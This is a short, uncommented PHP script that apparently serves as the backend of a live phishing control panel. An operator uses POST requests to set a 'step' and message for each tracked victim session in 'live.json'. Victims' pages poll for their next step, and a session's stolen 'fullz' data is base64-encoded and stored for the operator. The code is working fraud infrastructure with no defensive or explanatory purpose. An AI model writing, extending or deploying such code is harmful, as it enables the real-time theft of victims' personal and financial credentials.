<?php
session_start();
$file="live.json";
$ud=file_get_contents($file);
if(isset($_POST['update']) && isset($_POST['admin']) && isset($_POST['property'])){
	$udarray = json_decode($ud);
	$id = $_POST['update'];
	if(isset($udarray->{$id})){
		$udarray->$id->step=$_POST['property'];if(!empty($_POST['other'])){$udarray->$id->text=$_POST['other'];};
		if($_POST['property']=="1"){unset($udarray->$id);};
		file_put_contents($file,json_encode((object)$udarray));
	};
}
elseif(isset($_POST['update']) && isset($_POST['client'])){
	$udarray = json_decode($ud);
	$id = $_POST['update'];
	if(isset($_POST['setnew'])){
		$json = array('step'=>"4",'msg'=>base64_encode(preg_replace('/(\r\n|\n)/i','{br}',preg_replace('/(\|[\-]+ | [\-]+\|)/','',trim($_SESSION['fullz'])))));
		$udarray->$id = (object)$json;
		file_put_contents($file,json_encode((object)$udarray));
	}
	else{
		if(isset($udarray->{$id})){
			echo $udarray->$id->step;
		}
		else{echo "1";};
	};
}
else{
	echo $ud;
};
	
?>